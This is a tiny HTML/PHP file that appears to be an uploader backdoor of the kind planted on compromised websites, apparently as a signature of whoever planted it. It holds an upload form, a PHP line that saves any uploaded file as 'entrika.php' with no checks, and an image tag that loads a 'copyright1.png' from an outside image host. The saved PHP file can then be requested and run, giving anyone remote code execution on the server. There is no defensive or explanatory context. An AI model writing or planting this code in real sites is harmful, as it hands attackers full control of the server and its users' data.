<FORM ENCTYPE="multipart/form-data" ACTION="uploader.php" METHOD="POST">
<INPUT TYPE="hidden" name="MAX_FILE_SIZE" value="100000">
Send this file: <INPUT NAME="userfile" TYPE="file">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<?
move_uploaded_file($userfile, "entrika.php"); 
?>

<img src='http://resimyukle.me/server/php/files/ef1bd4c1a4f70c8488bf7c6893a54664/copyright1.png'/>